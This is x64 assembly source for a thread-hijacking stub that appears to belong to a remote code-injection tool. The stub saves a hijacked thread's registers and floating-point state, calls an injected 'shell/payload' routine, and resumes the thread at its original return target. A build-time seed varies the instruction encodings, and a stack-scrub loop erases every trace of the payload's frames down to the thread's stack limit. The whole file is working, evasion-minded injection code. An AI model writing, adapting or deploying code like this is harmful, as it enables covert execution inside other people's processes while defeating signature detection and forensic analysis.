INCLUDE RemoteShell.inc

REMOTE_THREAD SEGMENT ALIGN(16) 'CODE'

PUBLIC RemoteThreadHijackBegin
PUBLIC RemoteThreadHijackEnd
PUBLIC RemoteThreadReturnTarget
PUBLIC RemoteThreadState

; Patch-site labels. The C++ trampoline builder derives every relocation
; site from these exported labels instead of scanning for opcode bytes, so a
; change in the assembler's encoding fails closed at a named site rather than
; silently patching the wrong location.
PUBLIC RemoteThreadLeaStateIn
PUBLIC RemoteThreadLeaStateOut
PUBLIC RemoteThreadJmpReturn
PUBLIC RemoteThreadTebReadIn
PUBLIC RemoteThreadTebReadOut
PUBLIC RemoteThreadTebWrite

IFDEF AMEGER_STUB_SEED
STUB_SEED EQU AMEGER_STUB_SEED
ELSE
STUB_SEED EQU 0
ENDIF
STUB_FP_ADDR     EQU (STUB_SEED AND 1)
STUB_FP_WIDTH    EQU (STUB_SEED AND 2)
STUB_RSP_CAPTURE EQU (STUB_SEED AND 4)

RemoteThreadHijackBegin:
    pushfq
    push rax
    push rcx
    push rdx
    push rbx
    push rbp
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

RemoteThreadLeaStateIn:
    lea rbx, [RemoteThreadState]
IF STUB_RSP_CAPTURE
    lea r12, [rsp]
ELSE
    mov r12, rsp
ENDIF
    mov [rbx+SR_SAVED_RSP], r12
    and rsp, 0FFFFFFFFFFFFFFF0h
    sub rsp, 40h

IF STUB_FP_ADDR
    mov r10, rbx
    add r10, SR_FP_AREA
ELSE
    lea r10, [rbx+SR_FP_AREA]
ENDIF
    cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
    jne StubFpSaveFallback
    mov eax, [rbx+SR_FP_MASK]
    xor edx, edx
IF STUB_FP_WIDTH
    xsave64 [r10]
ELSE
    xsave [r10]
ENDIF
    jmp StubFpSaveDone
StubFpSaveFallback:
IF STUB_FP_WIDTH
    fxsave64 [r10]
ELSE
    fxsave [r10]
ENDIF
StubFpSaveDone:

    fldcw word ptr [rbx+SR_SHELL_CW]
    ldmxcsr dword ptr [rbx+SR_SHELL_MXCSR]

    mov r15, [rbx+SR_ROUTINE]
    mov rcx, [rbx+SR_ARG]
RemoteThreadTebReadIn:
    mov r11d, gs:[TEB_LAST_ERROR]
    mov [rbx+SR_BUFFER], r11d
    mov qword ptr [rbx+SR_STATE], 1
    ; Ground-truth cycle capture: t0 -> [SR_CYCLES_DELTA] temp, then delta after call.
    rdtsc
    shl rdx, 32
    or rax, rdx
    mov [rbx+SR_CYCLES_DELTA], rax
    mov rax, r15
    call rax
    mov [rbx+SR_RET], eax
    ; t1 - t0 -> RoutineCyclesDelta.
    push rcx
    push rdx
    rdtsc
    shl rdx, 32
    or rax, rdx
    sub rax, [rbx+SR_CYCLES_DELTA]
    mov [rbx+SR_CYCLES_DELTA], rax
    pop rdx
    pop rcx
RemoteThreadTebReadOut:
    mov r11d, gs:[TEB_LAST_ERROR]
    mov [rbx+SR_LAST_ERROR], r11d
    mov r11d, [rbx+SR_BUFFER]
RemoteThreadTebWrite:
    mov gs:[TEB_LAST_ERROR], r11d
    mov qword ptr [rbx+SR_STATE], 2
RemoteThreadLeaStateOut:
    lea rbx, [RemoteThreadState]
    mov r12, [rbx+SR_SAVED_RSP]

IF STUB_FP_ADDR
    mov r10, rbx
    add r10, SR_FP_AREA
ELSE
    lea r10, [rbx+SR_FP_AREA]
ENDIF
    cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
    jne StubFpRestoreFallback
    mov eax, [rbx+SR_FP_MASK]
    xor edx, edx
IF STUB_FP_WIDTH
    xrstor64 [r10]
ELSE
    xrstor [r10]
ENDIF
    jmp StubFpRestoreDone
StubFpRestoreFallback:
IF STUB_FP_WIDTH
    fxrstor64 [r10]
ELSE
    fxrstor [r10]
ENDIF
    StubFpRestoreDone:
    ; Scrub every dead stack slot the hijack touched, from the saved RSP down to
    ; the thread's current stack limit. The stub's own frame ends only 0x48 below
    ; r12, but the shell/payload ran far deeper on this same stack, so the floor
    ; has to be StackLimit (TEB::StackLimit, gs:[0x10]) - a fixed r12-relative
    ; floor leaves the shell's frames, and the pointers into the payload they
    ; hold, in place. StackLimit is the lowest committed page, so the walk never
    ; reaches the guard page. rdi/r10/rdx/r8 are all restored by the pops below.
    lea rdi, [r12]
    mov r10, gs:[10h]
    cmp r10, rdi
    jae StubStackScrubDone
    ; Ground-truth scrub audit: (saved_rsp - StackLimit) in bytes.
    mov rax, r12
    sub rax, r10
    mov [rbx+SR_SCRUB_BYTES], rax
    mov rdx, rdi
    sub rdx, r10
    shr rdx, 3
    xor r8d, r8d
StubStackScrubLoop:
    test rdx, rdx
    jz StubStackScrubDone
    mov qword ptr [rdi-8], r8
    sub rdi, 8
    dec rdx
    jmp StubStackScrubLoop
StubStackScrubDone:
    mov rsp, r12
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbp
    pop rbx
    pop rdx
    pop rcx
    pop rax
    popfq
RemoteThreadJmpReturn:
    jmp qword ptr [RemoteThreadReturnTarget]

ALIGN 16
RemoteThreadState:
RemoteThreadStateFlag    DQ 0
RemoteThreadRet          DD 0
RemoteThreadPad1         DD 0
RemoteThreadLastError    DD 0
RemoteThreadPad2         DD 0
RemoteThreadArg          DQ 0
RemoteThreadRoutine      DQ 0
RemoteThreadBuffer       DQ 0
RemoteThreadFpFlags      DQ 0
RemoteThreadFpMask       DQ 0
RemoteThreadShellCw      DW 037Fh
RemoteThreadShellCwPad0  DW 0
RemoteThreadShellCwPad1  DD 0
RemoteThreadShellMxcsr   DD 01F80h
RemoteThreadShellMxPad   DD 0
RemoteThreadCyclesDelta  DQ 0
RemoteThreadScrubBytes   DQ 0
RemoteThreadSavedRsp     DQ 0
RemoteThreadFpReserved   BYTE 24 DUP (0)
RemoteThreadFpArea       BYTE SR_FP_AREA_SIZE DUP (0)
RemoteThreadReturnTarget DQ 0

RemoteThreadHijackEnd:

REMOTE_THREAD ENDS

END
